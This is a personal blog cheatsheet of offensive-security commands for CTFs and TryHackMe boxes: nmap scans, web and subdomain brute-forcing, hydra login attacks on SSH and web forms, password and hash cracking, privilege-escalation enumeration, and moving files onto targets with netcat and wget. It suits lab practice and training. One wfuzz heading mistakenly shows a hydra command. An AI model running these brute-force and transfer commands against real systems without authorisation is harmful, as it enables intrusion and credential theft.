---
layout: post
title: The Essentials - My Favorite Tools and Commands
summary: This cheatsheet contains essential commands I always use in CTFs, THM boxes, and in cybersecurity.  Includes commands and tools for discovery to transferring files, passing by web tools, and cracking. I encourage the other content creators to replicate this kind of cheatsheet on their platform (a mention will always be appreciated 😊).
date: 2020-07-30
categories: cheatsheets
author: Noxtal
thumbnail: gravatar
tags:
- essentials
- commands
- discovery
- web
- cracking
- privesc
- transferring
- nmap
- gobuster
- wfuzz
- wpscan
- hydra
- hashcat
- stegcracker
- fcrackzip
---

This cheatsheet contains essential commands I always use in CTFs, THM boxes, and in cybersecurity.  Includes commands and tools for discovery to transferring files, passing by web tools, and cracking. I encourage the other content creators to replicate this kind of cheatsheet on their platform (a mention will always be appreciated 😊).

-----

- [Discovery](#discovery)
  - [Nmap](#nmap)
  - [Web Directory and Query Parameters Bruteforce](#web-directory-and-query-parameters-bruteforce)
- [Web](#web)
  - [HTTP Form Bruteforce](#http-form-bruteforce)
  - [Wordpress](#wordpress)
  - [Subdomain Bruteforce](#subdomain-bruteforce)
- [Cracking](#cracking)
  - [ZIP](#zip)
  - [Hashes](#hashes)
  - [Bruteforce SSH](#bruteforce-ssh)
  - [Steganography](#steganography)
- [Privescs Discovery](#privescs-discovery)
- [Transferring Files](#transferring-files)

# Discovery
## Nmap
Basic nmap scan:
```bash
nmap -vv -sC -sV -oN nmap.log $IP
```

Complete nmap scan:
```bash
nmap -vv -A -p- -oN nmap-complete.log $IP
```

See my [nmap cheatsheet](https://noxtal.com/cheatsheets/2020/07/13/nmap-cheatsheet/#personnal-favorites) for other personal favorites.

## Web Directory and Query Parameters Bruteforce
Using gobuster:
```bash
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.log -t 200 -u $URL
```

Using wfuzz:
```bash
wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/FUZZ
```

Using wfuzz to bruteforce query parameters:
```bash
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/?parameter=FUZZ
```

Recursive directory scan with wfuzz:
```bash
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 200 --hc 404 -R $DEPTH http://www.host.name/FUZZ
```

# Web
## HTTP Form Bruteforce
Using Hydra:
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
```

Using wfuzz:
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
```

## Wordpress
WPScan + password bruteforce:
```bash
wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames usernames.txt
```

## Subdomain Bruteforce
Using wfuzz:
```bash
wfuzz -c -f wfuzz-sub.log -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u $URL -H "Host: FUZZ.host.name" -t 32 --hc 200 --hw 356
```

*Note: you will need to adjust the `--hc` and `--hw` parameters to your needs. Check `wfuzz -h` for more information about those.*

Using gobuster:
```bash
gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL -t 32
```

# Cracking
## ZIP
```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
```

## Hashes
Using hashcat:
```bash
hashcat -m $MODE hashes /usr/share/wordlists/rockyou.txt
```

## Bruteforce SSH
Using hydra:
```bash
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
```

## Steganography
Crack steghide passphrase using stegracker:
Install:
```bash
pip3 install stegcracker
```

Run:
```bash
python3 -m stegcracker tocrack.jpg
```

# Privescs Discovery
Find privescs exploiting SUID binaries:
```bash 
find / -perm -u=s -type f 2>/dev/null
```

Find privescs by listing sudo permissions:
```bash 
sudo -l
```

Enumerate interesting files, processes, and privescs using Linpeas:
1. Install [linpeas] on your machine.
2. Transfer it to the target machine. (see the [Transferring Files](#Transferring-files))
3. Make it executable, run it, and `tee` the output into a log file for further analysis.
  
```bash 
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.log
```

# Transferring Files
Open an HTTP server:
1. `cd` into the directory you want to access one or more files from.
2. Open an HTTP server:

```bash 
# PYTHON3
python3 -m http.server -b $IP $PORT

# PHP
php -S $IP:$PORT
```

{:start="3"}
3. Access the file:

```bash 
# Wget
wget http://$IP:$PORT/file

# Curl
curl http://$IP:$PORT/file -o target_file

# Netcat
nc $IP $PORT > target_file
```

Using SCP:
```bash 
# Send
scp /path/to/file user@$HOST:/path/

# Send with custom name
scp /path/to/file user@$HOST:/path/different_name

# Get
scp user@$HOST:/path/to/file /local/directory
```

*Note: To connect with an SSH key, you may need to use the `-i` flag followed by the path to the key.*

Using netcat:
```bash 
# Server
nc -lp $PORT < file

# Client
nc $IP $PORT > file
```